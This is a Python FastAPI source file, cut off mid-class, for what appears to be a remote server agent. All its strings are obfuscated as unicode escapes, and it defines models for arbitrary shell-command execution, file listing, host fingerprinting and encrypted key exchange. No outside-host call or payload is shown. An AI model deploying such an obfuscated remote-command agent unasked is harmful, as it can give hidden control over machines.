import codecs
import os
import sys
import errno
import posixpath
import json
import time
import re
import unicodedata
import base64
import hashlib
import hmac
import secrets
import threading
from datetime import datetime, timezone
from typing import Union, List, Dict, Any, Optional
from fastapi import FastAPI, Request, Response, HTTPException, status
from fastapi.responses import JSONResponse, StreamingResponse
from starlette.middleware.base import BaseHTTPMiddleware
from urllib.parse import unquote, urlsplit
from ecdsa import SigningKey, VerifyingKey, BadSignatureError, NIST256p
from ecdsa.util import sigdecode_der, sigdecode_string
import binascii
try:
    from ecies import encrypt as ecies_encrypt
except Exception:
    import hmac as _hmac_mod
    _SECP_P = 115792089237316195423570985008687907853269984665640564039457584007908834671663
    _SECP_N = 115792089237316195423570985008687907852837564279074904382605163141518161494337

    def _secp_decompress_pub(O0_var_1: bytes):
        from ecdsa import SECP256k1, VerifyingKey
        from ecdsa.ellipticcurve import Point
        if len(O0_var_1) == 65 and O0_var_1[0] == 4:
            return VerifyingKey.from_string(O0_var_1[1:], curve=SECP256k1).pubkey.point
        if len(O0_var_1) == 33 and O0_var_1[0] in (2, 3):
            O0_var_2 = int.from_bytes(O0_var_1[1:], codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))
            O0_var_3 = (pow(O0_var_2, 3, _SECP_P) + 7) % _SECP_P
            O0_var_4 = pow(O0_var_3, (_SECP_P + 1) // 4, _SECP_P)
            if O0_var_4 * O0_var_4 % _SECP_P != O0_var_3:
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0063\\u006f\\u006d\\u0070\\u0072\\u0065\\u0073\\u0073\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079', 'unicode_escape'))
            if O0_var_4 & 1 != O0_var_1[0] - 2:
                O0_var_4 = _SECP_P - O0_var_4
            return Point(SECP256k1.curve, O0_var_2, O0_var_4)
        raise ValueError(codecs.decode('\\u0075\\u006e\\u0073\\u0075\\u0070\\u0070\\u006f\\u0072\\u0074\\u0065\\u0064\\u0020\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074', 'unicode_escape'))

    def _secp_point_bytes(O0_var_5) -> bytes:
        return b'\x04' + O0_var_5.x().to_bytes(32, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) + O0_var_5.y().to_bytes(32, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape'))

    def _kisama_hkdf_sha256(O0_var_6: bytes, O0_var_7: int=32) -> bytes:
        O0_var_8 = _hmac_mod.new(b'', O0_var_6, hashlib.sha256).digest()
        O0_var_9 = b''
        O0_var_10 = b''
        O0_var_11 = 1
        while len(O0_var_9) < O0_var_7:
            O0_var_10 = _hmac_mod.new(O0_var_8, O0_var_10 + bytes([O0_var_11]), hashlib.sha256).digest()
            O0_var_9 += O0_var_10
            O0_var_11 += 1
        return O0_var_9[:O0_var_7]

    def _kisama_ecies_encrypt_fallback(O0_var_12: bytes, data: bytes) -> bytes:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        from ecdsa import SECP256k1, SigningKey as _EcdsaSigningKey
        O0_var_13 = _secp_decompress_pub(O0_var_12)
        while True:
            O0_var_14 = secrets.token_bytes(32)
            if 0 < int.from_bytes(O0_var_14, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')) < _SECP_N:
                break
        O0_var_15 = b'\x04' + _EcdsaSigningKey.from_string(O0_var_14, curve=SECP256k1).get_verifying_key().to_string()
        O0_var_16 = _secp_point_bytes(O0_var_13 * int.from_bytes(O0_var_14, codecs.decode('\\u0062\\u0069\\u0067', 'unicode_escape')))
        O0_var_17 = _kisama_hkdf_sha256(O0_var_15 + O0_var_16)
        O0_var_18 = secrets.token_bytes(16)
        O0_var_19 = AESGCM(O0_var_17).encrypt(O0_var_18, data, None)
        return O0_var_15 + O0_var_18 + O0_var_19[-16:] + O0_var_19[:-16]
    ecies_encrypt = _kisama_ecies_encrypt_fallback
import uvicorn
import asyncio
import platform
import psutil
import aiohttp
import socket
import ipaddress
import subprocess
import shlex
from fastapi import BackgroundTasks
from croniter import croniter
from collections import deque
from contextlib import asynccontextmanager
from pydantic import BaseModel, Field, RootModel, ConfigDict
from fastapi import Body, Depends, Query
try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
except Exception:

    def _kisama_get_random_bytes(O0_var_20: int) -> bytes:
        return os.urandom(O0_var_20)

    class _KisamaAESGCMFallback:

        def __init__(self, key: bytes, nonce: bytes):
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            self._aesgcm = AESGCM(key)
            self._nonce = nonce

        def encrypt_and_digest(self, O0_var_21: bytes):
            O0_var_22 = self._aesgcm.encrypt(self._nonce, O0_var_21, None)
            return (O0_var_22[:-16], O0_var_22[-16:])

        def decrypt_and_verify(self, O0_var_23: bytes, O0_var_24: bytes) -> bytes:
            return self._aesgcm.decrypt(self._nonce, O0_var_23 + O0_var_24, None)

    class _KisamaAESFallback:
        MODE_GCM = codecs.decode('\\u0067\\u0063\\u006d', 'unicode_escape')

        @staticmethod
        def new(key: bytes, mode, nonce: bytes=None):
            if nonce is None:
                raise ValueError(codecs.decode('\\u517c\\u5bb9\\u57ab\\u7247\\u4ec5\\u652f\\u6301\\u0020\\u0041\\u0045\\u0053\\u002d\\u0047\\u0043\\u004d\\u0020\\u4e14\\u5fc5\\u987b\\u63d0\\u4f9b\\u0020\\u006e\\u006f\\u006e\\u0063\\u0065', 'unicode_escape'))
            return _KisamaAESGCMFallback(key, nonce)
    AES = _KisamaAESFallback
    get_random_bytes = _kisama_get_random_bytes
from noise.connection import NoiseConnection, Keypair
from fastapi import WebSocket, WebSocketDisconnect
import shutil
import struct
import select
import signal
if os.name == codecs.decode('\\u006e\\u0074', 'unicode_escape'):
    termios = None
    fcntl = None
    pty = None
else:
    import termios
    import fcntl
    import pty
import http.client
import queue
import ssl
import urllib.error
import urllib.parse
import urllib.request
import uuid
from dataclasses import dataclass, asdict
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives import serialization
from typing import Tuple

def _load_dotenv():
    try:
        O0_var_25 = os.path.join(os.path.dirname(os.path.abspath(__file__)), codecs.decode('\\u002e\\u0065\\u006e\\u0076', 'unicode_escape'))
        if not os.path.isfile(O0_var_25):
            return
        with open(O0_var_25, codecs.decode('\\u0072', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_26:
            for O0_var_27 in O0_var_26:
                O0_var_28 = O0_var_27.strip()
                if not O0_var_28 or O0_var_28.startswith(codecs.decode('\\u0023', 'unicode_escape')):
                    continue
                if O0_var_28.startswith(codecs.decode('\\u0065\\u0078\\u0070\\u006f\\u0072\\u0074\\u0020', 'unicode_escape')):
                    O0_var_28 = O0_var_28[len(codecs.decode('\\u0065\\u0078\\u0070\\u006f\\u0072\\u0074\\u0020', 'unicode_escape')):].lstrip()
                if codecs.decode('\\u003d', 'unicode_escape') not in O0_var_28:
                    continue
                O0_var_29, O0_var_30, O0_var_31 = O0_var_28.partition(codecs.decode('\\u003d', 'unicode_escape'))
                O0_var_29 = O0_var_29.strip()
                O0_var_31 = O0_var_31.strip()
                if len(O0_var_31) >= 2 and O0_var_31[0] == O0_var_31[-1] and (O0_var_31[0] in (codecs.decode('\\u0022', 'unicode_escape'), codecs.decode('\\u0027', 'unicode_escape'))):
                    O0_var_31 = O0_var_31[1:-1]
                if O0_var_29:
                    os.environ.setdefault(O0_var_29, O0_var_31)
    except Exception:
        pass
_load_dotenv()

def _resolve_safe_cwd():
    for O0_var_32 in (os.environ.get(codecs.decode('\\u0055\\u0053\\u0045\\u0052\\u0050\\u0052\\u004f\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')), os.environ.get(codecs.decode('\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
        if O0_var_32 and os.path.isdir(O0_var_32):
            return O0_var_32
    return codecs.decode('\\u002e', 'unicode_escape')

def _resolve_safe_file_root():
    for O0_var_33 in (os.getenv(codecs.decode('\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
        if O0_var_33 and os.path.isdir(O0_var_33):
            return O0_var_33
        if O0_var_33:
            print(codecs.decode('\\u005b\\u0057\\u0041\\u0052\\u004e\\u005d\\u0020\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054\\u0020\\u5019\\u9009\\u76ee\\u5f55\\u4e0d\\u5b58\\u5728\\u002c\\u0020\\u5df2\\u8df3\\u8fc7\\u003a\\u0020', 'unicode_escape') + str(O0_var_33))
    print(codecs.decode('\\u005b\\u0057\\u0041\\u0052\\u004e\\u005d\\u0020\\u0046\\u0049\\u004c\\u0045\\u005f\\u0052\\u004f\\u004f\\u0054\\u0020\\u5168\\u90e8\\u5019\\u9009\\u65e0\\u6548\\u002c\\u0020\\u964d\\u7ea7\\u5230\\u5f53\\u524d\\u5de5\\u4f5c\\u76ee\\u5f55\\u003a\\u0020', 'unicode_escape') + str(os.getcwd()))
    return os.getcwd()

class SResponse(BaseModel):
    codecs.decode('\\u901a\\u7528\\u72b6\\u6001\\u54cd\\u5e94', 'unicode_escape')
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')])

class CountResponse(SResponse):
    codecs.decode('\\u5e26\\u8ba1\\u6570\\u7684\\u901a\\u7528\\u54cd\\u5e94', 'unicode_escape')
    count: int = Field(..., examples=[0])

class BaseInfoResponse(BaseModel):
    codecs.decode('\\u4ee3\\u7406\\u57fa\\u7840\\u4fe1\\u606f\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    arch: str = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u67b6\\u6784', 'unicode_escape'), examples=[codecs.decode('\\u0078\\u0038\\u0036\\u005f\\u0036\\u0034', 'unicode_escape')])
    cpu_cores: int = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u6838\\u5fc3\\u6570', 'unicode_escape'), examples=[4])
    cpu_name: str = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u578b\\u53f7', 'unicode_escape'), examples=[codecs.decode('\\u0049\\u006e\\u0074\\u0065\\u006c\\u0028\\u0052\\u0029\\u0020\\u0058\\u0065\\u006f\\u006e\\u0028\\u0052\\u0029\\u0020\\u0043\\u0050\\u0055\\u0020\\u0040\\u0020\\u0032\\u002e\\u0032\\u0030\\u0047\\u0048\\u007a', 'unicode_escape')])
    disk_total: int = Field(..., description=codecs.decode('\\u78c1\\u76d8\\u603b\\u5bb9\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[48360738816])
    gpu_name: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u0047\\u0050\\u0055\\u578b\\u53f7', 'unicode_escape'), examples=[codecs.decode('\\u004e\\u0056\\u0049\\u0044\\u0049\\u0041\\u0020\\u0047\\u0065\\u0046\\u006f\\u0072\\u0063\\u0065\\u0020\\u0052\\u0054\\u0058\\u0020\\u0033\\u0030\\u0039\\u0030', 'unicode_escape')])
    ipv4: Optional[str] = Field(None, description=codecs.decode('\\u0049\\u0050\\u0076\\u0034\\u5730\\u5740', 'unicode_escape'), examples=[codecs.decode('\\u0031\\u0039\\u0032\\u002e\\u0031\\u0036\\u0038\\u002e\\u0031\\u002e\\u0031\\u0030\\u0030', 'unicode_escape')])
    ipv6: Optional[str] = Field(None, description=codecs.decode('\\u0049\\u0050\\u0076\\u0036\\u5730\\u5740', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0030\\u0031\\u003a\\u0064\\u0062\\u0038\\u003a\\u003a\\u0031', 'unicode_escape')])
    mem_total: int = Field(..., description=codecs.decode('\\u5185\\u5b58\\u603b\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[8589934592])
    os: str = Field(..., description=codecs.decode('\\u64cd\\u4f5c\\u7cfb\\u7edf\\u540d\\u79f0', 'unicode_escape'), examples=[codecs.decode('\\u0055\\u0062\\u0075\\u006e\\u0074\\u0075\\u0020\\u0032\\u0032\\u002e\\u0030\\u0034', 'unicode_escape')])
    kernel_version: str = Field(..., description=codecs.decode('\\u5185\\u6838\\u7248\\u672c', 'unicode_escape'), examples=[codecs.decode('\\u0035\\u002e\\u0031\\u0035\\u002e\\u0030\\u002d\\u0037\\u0036\\u002d\\u0067\\u0065\\u006e\\u0065\\u0072\\u0069\\u0063', 'unicode_escape')])
    swap_total: int = Field(..., description=codecs.decode('\\u4ea4\\u6362\\u5206\\u533a\\u603b\\u91cf\\u0028\\u5b57\\u8282\\u0029', 'unicode_escape'), examples=[0])
    version: str = Field(..., description=codecs.decode('\\u4ee3\\u7406\\u7248\\u672c', 'unicode_escape'), examples=[codecs.decode('\\u0030\\u002e\\u0030\\u002e\\u0031', 'unicode_escape')])
    virtualization: str = Field(..., description=codecs.decode('\\u865a\\u62df\\u5316\\u73af\\u5883', 'unicode_escape'), examples=[codecs.decode('\\u004e\\u006f\\u006e\\u0065', 'unicode_escape')])
    marks: List[str] = Field(default_factory=list, description=codecs.decode('\\u4e3b\\u673a\\u6807\\u8bb0\\u0020\\u0028\\u0072\\u006f\\u006f\\u0074\\u002f\\u006b\\u0076\\u006d\\u002f\\u0070\\u0074\\u0065\\u0072\\u006f\\u0064\\u0061\\u0063\\u0074\\u0079\\u006c\\u002f\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0064\\u002f\\u0066\\u0075\\u0073\\u0065\\u0020\\u002b\\u0020\\u914d\\u7f6e\\u7c7b\\u0020\\u006b\\u0073\\u0074\\u006f\\u0072\\u0065\\u002f\\u006b\\u006d\\u006f\\u0064\\u0065\\u0031\\u002f\\u006b\\u006d\\u006f\\u0064\\u0065\\u0032\\u002c\\u0020\\u987a\\u5e8f\\u56fa\\u5b9a\\u0029', 'unicode_escape'), examples=[[codecs.decode('\\u0072\\u006f\\u006f\\u0074', 'unicode_escape'), codecs.decode('\\u006b\\u0076\\u006d', 'unicode_escape'), codecs.decode('\\u0073\\u0079\\u0073\\u0074\\u0065\\u006d\\u0064', 'unicode_escape'), codecs.decode('\\u0066\\u0075\\u0073\\u0065', 'unicode_escape')]])
    session_key: Optional[bytes] = Field(None, description=codecs.decode('\\u672c\\u6b21\\u4f1a\\u8bdd\\u7684\\u52a8\\u6001\\u0020\\u0041\\u0045\\u0053\\u002d\\u0032\\u0035\\u0036\\u0020\\u5bc6\\u94a5\\u0020\\u0028\\u660e\\u6587\\uff0c\\u7531\\u4e2d\\u95f4\\u4ef6\\u8d1f\\u8d23\\u52a0\\u5bc6\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u006b\\u0037\\u0042\\u0076\\u0039\\u002e\\u002e\\u002e\\u0033\\u0032\\u4f4d\\u5bc6\\u94a5\\u5b57\\u7b26\\u4e32\\u6216\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034', 'unicode_escape')])
    noise_key: Optional[Dict[str, Any]] = Field(None, description=codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u5bc6\\u94a5\\u914d\\u7f6e\\uff0c\\u63a5\\u6536\\u4efb\\u610f\\u5b57\\u5178\\u7ed3\\u6784', 'unicode_escape'))

class StatusResponse(BaseModel):
    codecs.decode('\\u5b9e\\u65f6\\u76d1\\u63a7\\u4fe1\\u606f\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    cpu: Dict[str, float] = Field(..., description=codecs.decode('\\u0043\\u0050\\u0055\\u4f7f\\u7528\\u7387', 'unicode_escape'), examples=[{codecs.decode('\\u0075\\u0073\\u0061\\u0067\\u0065', 'unicode_escape'): 12.5}])
    ram: Dict[str, int] = Field(..., description=codecs.decode('\\u5185\\u5b58\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 8589934592, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 4000000000}])
    swap: Dict[str, int] = Field(..., description=codecs.decode('\\u4ea4\\u6362\\u5206\\u533a\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 0, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 0}])
    load: Dict[str, float] = Field(..., description=codecs.decode('\\u7cfb\\u7edf\\u8d1f\\u8f7d', 'unicode_escape'), examples=[{codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031', 'unicode_escape'): 0.5, codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0035', 'unicode_escape'): 0.4, codecs.decode('\\u006c\\u006f\\u0061\\u0064\\u0031\\u0035', 'unicode_escape'): 0.3}])
    disk: Dict[str, int] = Field(..., description=codecs.decode('\\u78c1\\u76d8\\u4fe1\\u606f', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): 48360738816, codecs.decode('\\u0075\\u0073\\u0065\\u0064', 'unicode_escape'): 30000000000}])
    network: Dict[str, int] = Field(..., description=codecs.decode('\\u7f51\\u7edc\\u7edf\\u8ba1', 'unicode_escape'), examples=[{codecs.decode('\\u0075\\u0070', 'unicode_escape'): 1024, codecs.decode('\\u0064\\u006f\\u0077\\u006e', 'unicode_escape'): 2048, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0055\\u0070', 'unicode_escape'): 1000000, codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0044\\u006f\\u0077\\u006e', 'unicode_escape'): 2000000}])
    connections: Dict[str, int] = Field(..., description=codecs.decode('\\u8fde\\u63a5\\u6570', 'unicode_escape'), examples=[{codecs.decode('\\u0074\\u0063\\u0070', 'unicode_escape'): 20, codecs.decode('\\u0075\\u0064\\u0070', 'unicode_escape'): 5}])
    uptime: int = Field(..., description=codecs.decode('\\u8fd0\\u884c\\u65f6\\u95f4\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[3600])
    process: int = Field(..., description=codecs.decode('\\u8fdb\\u7a0b\\u6570\\u91cf', 'unicode_escape'), examples=[150])
    message: str = Field(codecs.decode('', 'unicode_escape'), description=codecs.decode('\\u9644\\u52a0\\u6d88\\u606f', 'unicode_escape'), examples=[codecs.decode('', 'unicode_escape')])

class ExecResponse(BaseModel):
    result: str = Field(..., description=codecs.decode('\\u547d\\u4ee4\\u8f93\\u51fa\\u0028\\u0073\\u0074\\u0064\\u006f\\u0075\\u0074\\u002b\\u0073\\u0074\\u0064\\u0065\\u0072\\u0072\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c\\u0020\\u0034\\u000a\\u0064\\u0072\\u0077\\u0078\\u0072\\u002d\\u0078\\u0072\\u002d\\u0078\\u002e\\u002e\\u002e', 'unicode_escape')])
    exitcode: int = Field(..., description=codecs.decode('\\u9000\\u51fa\\u7801\\u0020\\u0028\\u0030\\u003d\\u6210\\u529f\\u002c\\u0020\\u0031\\u0032\\u0034\\u003d\\u8d85\\u65f6\\u002c\\u0020\\u0031\\u0032\\u0037\\u003d\\u672a\\u627e\\u5230\\u0029', 'unicode_escape'), examples=[0])
    timeout: bool = Field(..., description=codecs.decode('\\u662f\\u5426\\u56e0\\u8d85\\u65f6\\u88ab\\u7ec8\\u6b62', 'unicode_escape'), examples=[False])
    cmd: str = Field(..., description=codecs.decode('\\u5b9e\\u9645\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'), examples=[codecs.decode('\\u006c\\u0073\\u0020\\u002d\\u006c\\u0061\\u0020\\u002f\\u0074\\u006d\\u0070', 'unicode_escape')])

class TempKeyEcdsaPair(BaseModel):
    codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u7f3a\\u7701\\u0020\\u0050\\u0045\\u004d\\u003b\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u003d\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u65f6\\u79c1\\u94a5\\u4e3a\\u0020\\u0036\\u0034\\u4f4d\\u0068\\u0065\\u0078\\u0020\\u6807\\u91cf\\u3001\\u516c\\u94a5\\u4e3a\\u0020\\u0033\\u0033\\u5b57\\u8282\\u538b\\u7f29\\u70b9\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u002c\\u0020\\u0030\\u002e\\u0035\\u002e\\u0038\\u0029', 'unicode_escape')
    private_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u79c1\\u94a5\\u0020\\u0028\\u7f3a\\u7701\\u0020\\u0050\\u0045\\u004d\\u0020\\u002f\\u0020\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u683c\\u5f0f\\u0020\\u0036\\u0034\\u4f4d\\u0068\\u0065\\u0078\\u002c\\u0020\\u7528\\u4e8e\\u7b7e\\u540d\\u8bf7\\u6c42\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0052\\u0049\\u0056\\u0041\\u0054\\u0045\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e', 'unicode_escape')])
    public_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0044\\u0053\\u0041\\u0020\\u516c\\u94a5\\u0020\\u0028\\u7f3a\\u7701\\u0020\\u0050\\u0045\\u004d\\u0020\\u002f\\u0020\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u683c\\u5f0f\\u538b\\u7f29\\u70b9\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u002d\\u0042\\u0045\\u0047\\u0049\\u004e\\u0020\\u0050\\u0055\\u0042\\u004c\\u0049\\u0043\\u0020\\u004b\\u0045\\u0059\\u002d\\u002d\\u002d\\u002d\\u002d\\u002e\\u002e\\u002e', 'unicode_escape')])

class TempKeyEciesPair(BaseModel):
    codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u5bc6\\u94a5\\u5bf9\\u0020\\u0028\\u5341\\u516d\\u8fdb\\u5236\\u683c\\u5f0f\\u003b\\u0020\\u0066\\u006f\\u0072\\u006d\\u0061\\u0074\\u003d\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u65f6\\u4ec5\\u516c\\u94a5\\u6362\\u4e3a\\u0020\\u0033\\u0033\\u5b57\\u8282\\u538b\\u7f29\\u70b9\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u0029', 'unicode_escape')
    private_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u79c1\\u94a5\\u0020\\u0028\\u0068\\u0065\\u0078\\u002c\\u0020\\u0036\\u0034\\u5b57\\u7b26\\u003d\\u0033\\u0032\\u5b57\\u8282\\u002c\\u0020\\u7528\\u4e8e\\u89e3\\u5bc6\\u54cd\\u5e94\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0061\\u0065\\u0036\\u0038\\u0064\\u0030\\u0065\\u0063\\u0038\\u0033\\u0065\\u0037\\u0065\\u0061\\u0030\\u0064\\u0034\\u0037\\u0034\\u0033\\u0034\\u0061\\u0035\\u0039\\u0063\\u0034\\u0032\\u0036\\u0035\\u0036\\u0064\\u0033\\u0030\\u0065\\u0036\\u0065\\u0062\\u0065\\u0031\\u0063\\u0039\\u0032\\u0039\\u0037\\u0036\\u0062\\u0035\\u0037\\u0031\\u0038\\u0035\\u0039\\u0063\\u0038\\u0066\\u0063\\u0062\\u0064\\u0064\\u0030\\u0034\\u0038\\u0037\\u0030', 'unicode_escape')])
    public_key: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u0020\\u0045\\u0043\\u0049\\u0045\\u0053\\u0020\\u516c\\u94a5\\u0020\\u0028\\u7f3a\\u7701\\u0020\\u0068\\u0065\\u0078\\u0020\\u0031\\u0033\\u0030\\u5b57\\u7b26\\u0020\\u002f\\u0020\\u0073\\u0068\\u006f\\u0072\\u0074\\u0020\\u683c\\u5f0f\\u538b\\u7f29\\u70b9\\u0020\\u0042\\u0061\\u0073\\u0065\\u0036\\u0034\\u002c\\u0020\\u4f9b\\u4ee3\\u7406\\u7aef\\u52a0\\u5bc6\\u54cd\\u5e94\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0030\\u0034\\u0062\\u0063\\u0066\\u0037\\u0031\\u0063\\u0036\\u0037\\u0062\\u0039\\u0066\\u0033\\u0036\\u0037\\u0032\\u0035\\u0066\\u0035\\u0034\\u0063\\u0034\\u0031\\u0066\\u0039\\u0036\\u0035\\u0032\\u0061\\u0063\\u0066\\u002e\\u002e\\u002e', 'unicode_escape')])

class TempKeyResponse(BaseModel):
    codecs.decode('\\u83b7\\u53d6\\u4e34\\u65f6\\u5bc6\\u94a5\\u54cd\\u5e94\\u6a21\\u578b', 'unicode_escape')
    status: str = Field(codecs.decode('\\u006f\\u006b', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    key_id: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u5bc6\\u94a5\\u6807\\u8bc6', 'unicode_escape'), examples=[codecs.decode('\\u0033\\u0066\\u0039\\u0061\\u0030\\u0062\\u0032\\u0063\\u0034\\u0064\\u0035\\u0065\\u0036\\u0066\\u0037\\u0038', 'unicode_escape')])
    ttl_seconds: int = Field(..., description=codecs.decode('\\u6709\\u6548\\u671f\\u0028\\u79d2\\u0029', 'unicode_escape'), examples=[86400])
    created_at: str = Field(..., description=codecs.decode('\\u751f\\u6210\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0020\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0030\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    expires_at: str = Field(..., description=codecs.decode('\\u8fc7\\u671f\\u65f6\\u95f4\\u0020\\u0028\\u0055\\u0054\\u0043\\u0020\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0030\\u0039\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    ecdsa: TempKeyEcdsaPair
    ecies: TempKeyEciesPair

class ExecRequestJSON(BaseModel):
    cmd: str = Field(..., description=codecs.decode('\\u8981\\u6267\\u884c\\u7684\\u547d\\u4ee4', 'unicode_escape'), examples=[codecs.decode('\\u006c\\u0073\\u0020\\u002d\\u006c\\u0061\\u0020\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u0070\\u0079\\u0074\\u0068\\u006f\\u006e\\u0020\\u002d\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape')])
    cwd: Optional[str] = Field(None, description=codecs.decode('\\u5de5\\u4f5c\\u76ee\\u5f55', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')])
    env: Optional[Dict[str, str]] = Field(None, description=codecs.decode('\\u989d\\u5916\\u73af\\u5883\\u53d8\\u91cf', 'unicode_escape'), examples=[{codecs.decode('\\u0050\\u0041\\u0054\\u0048', 'unicode_escape'): codecs.decode('\\u002f\\u0075\\u0073\\u0072\\u002f\\u0062\\u0069\\u006e', 'unicode_escape'), codecs.decode('\\u0044\\u0045\\u0042\\u0055\\u0047', 'unicode_escape'): codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')}])

class FileListRequest(BaseModel):
    path: str = Field(codecs.decode('\\u002e', 'unicode_escape'), description=codecs.decode('\\u8981\\u5217\\u51fa\\u7684\\u76ee\\u5f55\\u8def\\u5f84', 'unicode_escape'), examples=[codecs.decode('\\u002f\\u0074\\u006d\\u0070', 'unicode_escape'), codecs.decode('\\u002e', 'unicode_escape'), codecs.decode('\\u002f\\u0076\\u0061\\u0072\\u002f\\u006c\\u006f\\u0067', 'unicode_escape')])
    recursive: bool = Field(False, description=codecs.decode('\\u662f\\u5426\\u9012\\u5f52\\u5217\\u51fa\\u5b50\\u76ee\\u5f55', 'unicode_escape'), examples=[True, False])

class FileInfo(BaseModel):
    name: str
    path: str
    type: str
    size: int
    mtime: str
    mode: str
    mode_octal: str
    owner: str

class FileListResponse(CountResponse):
    files: List[FileInfo]

class AuthorityQueryRequest(BaseModel):
